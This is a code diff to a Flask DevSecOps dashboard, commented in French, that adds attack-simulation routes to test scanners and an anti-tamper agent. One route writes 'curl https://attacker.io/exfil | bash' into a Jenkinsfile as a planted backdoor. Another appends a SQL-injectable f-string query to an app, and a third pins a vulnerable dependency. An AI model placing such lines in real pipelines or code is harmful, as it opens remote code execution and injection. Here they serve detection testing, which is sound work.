@@ -7,6 +7,8 @@ import json
 import os
 import glob
 import time
+import subprocess
+import threading
 from datetime import datetime
 from flask import Flask, render_template, jsonify, send_from_directory
 
@@ -14,6 +16,7 @@ app = Flask(__name__, template_folder="templates", static_folder="static")
 
 REPORTS_DIR = os.path.join(os.path.dirname(__file__), "..", "reports")
 AGENT_DIR   = os.path.join(os.path.dirname(__file__), "..", "agent")
+BASE_DIR    = os.path.join(os.path.dirname(__file__), "..")
 
 # ─── helpers ────────────────────────────────────────────────────────────────
 
@@ -61,7 +64,7 @@ def load_ai():
             return load_json(p)
     return {}
 
-# ─── routes ─────────────────────────────────────────────────────────────────
+# ─── routes existantes ───────────────────────────────────────────────────────
 
 @app.route("/")
 def index():
@@ -146,9 +149,9 @@ def api_findings():
     for site in zap.get("site", []):
         for alert in site.get("alerts", []):
             rd = alert.get("riskdesc", "")
-            if rd.startswith("High"):   sev_key = "high"
-            elif rd.startswith("Medium"): sev_key = "medium"
-            else:                         sev_key = "info"
+            if rd.startswith("High"):       sev_key = "high"
+            elif rd.startswith("Medium"):   sev_key = "medium"
+            else:                           sev_key = "info"
             findings.append({
                 "source": "DAST",
                 "severity": sev_key,
@@ -186,6 +189,168 @@ def api_reports():
 @app.route("/reports/<path:filename>")
 def serve_report(filename):
     return send_from_directory(REPORTS_DIR, filename)
+
+# ─── NOUVELLES ROUTES D'ATTAQUE ──────────────────────────────────────────────
+
+@app.route("/api/attack/cve", methods=["POST"])
+def api_attack_cve():
+    """Scénario 1 — Injecte py==1.11.0 dans requirements.txt et lance Trivy."""
+    req_path = os.path.join(BASE_DIR, "test-app/requirements.txt")
+
+    # Sauvegarde du contenu original
+    try:
+        with open(req_path, "r") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {req_path}"})
+
+    try:
+        # Injection de la dépendance vulnérable
+        with open(req_path, "a") as f:
+            f.write("\npy==1.11.0\n")
+
+        # Lance Trivy sur le fichier modifié
+        result = subprocess.run([
+            "trivy", "fs", "./test-app",
+            "--format", "json",
+            "--severity", "HIGH,CRITICAL",
+            "--cache-dir", "/var/trivy-cache",
+            "--skip-db-update",
+            "--quiet"
+        ], capture_output=True, text=True, cwd=BASE_DIR)
+
+        try:
+            data = json.loads(result.stdout)
+            cves = [v for r in data.get("Results", [])
+                    for v in (r.get("Vulnerabilities") or [])]
+            return jsonify({
+                "success": True,
+                "cve_found": len(cves),
+                "cves": [{"id": v["VulnerabilityID"],
+                          "severity": v["Severity"]} for v in cves[:5]]
+            })
+        except Exception:
+            return jsonify({"success": False, "error": result.stderr[:200]})
+
+    finally:
+        # Restaure toujours le fichier original
+        with open(req_path, "w") as f:
+            f.write(original)
+
+
+@app.route("/api/attack/antitamper", methods=["POST"])
+def api_attack_antitamper():
+    """Scénario 2 — Injecte une backdoor dans le Jenkinsfile et lance l'agent Anti-Tamper."""
+    jf_path = os.path.join(BASE_DIR, "jenkinsfile")
+
+    try:
+        with open(jf_path, "r") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {jf_path}"})
+
+    try:
+        # Injection de la backdoor
+        backdoor = original.replace(
+            "stage('3. Build Docker')",
+            "stage('3. Build Docker') {\n    sh 'curl https://attacker.io/exfil | bash'\n}\nstage('3b. IGNORE'"
+        )
+        with open(jf_path, "w") as f:
+            f.write(backdoor)
+
+        # Lance l'agent Anti-Tamper
+        result = subprocess.run(
+            ["/opt/zerotrust-venv/bin/python3", "antitamper_agent.py"],
+            capture_output=True, text=True,
+            cwd=os.path.join(BASE_DIR, "agent"),
+            env={**os.environ, "PIPELINE_PATH": jf_path},
+            timeout=120
+        )
+
+        return jsonify({
+            "success": True,
+            "output": result.stdout[-500:],
+            "detected": "anomalie" in result.stdout.lower() or
+                        "tamper" in result.stdout.lower()
+        })
+
+    finally:
+        # Restaure toujours le fichier original
+        with open(jf_path, "w") as f:
+            f.write(original)
+
+
+@app.route("/api/attack/sqli", methods=["POST"])
+def api_attack_sqli():
+    """Scénario 3 — Injecte une SQLi dans app.py et lance Semgrep."""
+    app_path = os.path.join(BASE_DIR, "test-app/app.py")
+
+    try:
+        with open(app_path, "r") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {app_path}"})
+
+    try:
+        # Injection du code vulnérable
+        sqli_code = '''
+@app.route("/user")
+def get_user_sqli():
+    username = request.args.get("username", "")
+    query = f"SELECT * FROM users WHERE name=\'{username}\'"
+    return jsonify({"query": query})
+'''
+        with open(app_path, "a") as f:
+            f.write(sqli_code)
+
+        # Lance Semgrep
+        result = subprocess.run([
+            "/opt/zerotrust-venv/bin/semgrep",
+            "--config=auto", "test-app/",
+            "--json", "--severity=WARNING"
+        ], capture_output=True, text=True, cwd=BASE_DIR)
+
+        try:
+            data = json.loads(result.stdout)
+            findings = data.get("results", [])
+            return jsonify({
+                "success": True,
+                "findings": len(findings),
+                "sqli_detected": any(
+                    "injection" in str(f).lower() or "sql" in str(f).lower()
+                    for f in findings
+                )
+            })
+        except Exception:
+            return jsonify({"success": False, "error": result.stderr[:200]})
+
+    finally:
+        # Restaure toujours le fichier original
+        with open(app_path, "w") as f:
+            f.write(original)
+
+
+@app.route("/api/attack/fallback", methods=["POST"])
+def api_attack_fallback():
+    """Scénario 4 — Coupe temporairement l'accès Claude pour forcer le fallback Ollama."""
+
+    def run_fallback_test():
+        env = os.environ.copy()
+        env["ANTHROPIC_API_KEY"] = "sk-invalid-key-for-test"
+        result = subprocess.run(
+            ["/opt/zerotrust-venv/bin/python3", "agent/remediation_agent.py"],
+            env=env,
+            capture_output=True,
+            text=True,
+            timeout=120,
+            cwd=BASE_DIR
+        )
+        return result.stdout
+
+    thread = threading.Thread(target=run_fallback_test)
+    thread.start()
+    return jsonify({"success": True, "message": "Test fallback lancé — voir les logs de l'agent"})
+
 
 # ─── main ────────────────────────────────────────────────────────────────────
 
